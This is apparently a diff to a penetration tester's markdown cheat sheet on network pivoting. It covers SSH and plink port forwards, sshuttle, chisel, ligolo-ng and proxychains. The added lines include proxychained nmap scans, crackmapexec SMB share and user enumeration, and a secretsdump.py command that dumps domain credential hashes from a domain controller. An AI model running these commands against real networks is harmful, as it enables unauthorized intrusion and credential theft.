@@ -44,6 +44,7 @@ ssh -R 5555:127.0.0.1:5555 -p2222 <user>@<IP>
 -> Linux
 - https://github.com/jpillora/chisel/releases/download/v1.11.5/chisel_1.11.5_linux_amd64.deb
 
+
 ### pklink - Remote Port Forward
 ```powershell
 cmd.exe /c echo y | plink.exe -ssh -l <user> -pw <password> -R 192.168.0.20:1234:127.0.0.1:3306 192.168.0.20
@@ -55,10 +56,31 @@ cmd.exe /c echo y | plink.exe -ssh -l <user> -pw <password> -R 192.168.0.20:1234
 sshuttle -r user@<ip> --ssh-cmd "ssh -i private_key" 172.16.0.0/24
 ```
 
-### SSH + Proxychains
+### SSH + Proxychains commands
 edit /etc/proxychains.conf with socks4 127.0.0.1 8080
 ```bash
 ssh -N -D 127.0.0.1:8080 <user>@<ip> -p 2222
+```
+```bash
+proxychains ping <ip>
+```
+```bash
+proxychains nc <ip> <port>
+```
+```bash
+proxychains nmap -p <port> 192.168.0.0/24
+```
+```bash
+proxychains crackmapexec smb -u <user> -p <password> <target> --shares
+```
+```bash
+proxychains crackmapexec smb -u <user> -p <password> <dc-target> --users
+```
+```bash
+proxychains crackmapexec smb -u <user> -p <password> <target> 
+```
+```bash
+proxychains secretsdump.py -k -no-pass <dc> -just-dc-user '<domain>\<user>' -debug
 ```
   
 ### chisel  - Reverse Proxy
@@ -88,3 +110,10 @@ route print
 use auxiliary/server/socks_proxy
 run
 ```
+
+### Ligolo-ng
+-> Proxy
+- https://github.com/nicocha30/ligolo-ng/releases/download/v0.4.3/ligolo-ng_proxy_0.4.3_Linux_64bit.tar.gz
+
+-> Agent
+- https://github.com/nicocha30/ligolo-ng/releases/download/v0.4.3/ligolo-ng_agent_0.4.3_Linux_64bit.tar.gz
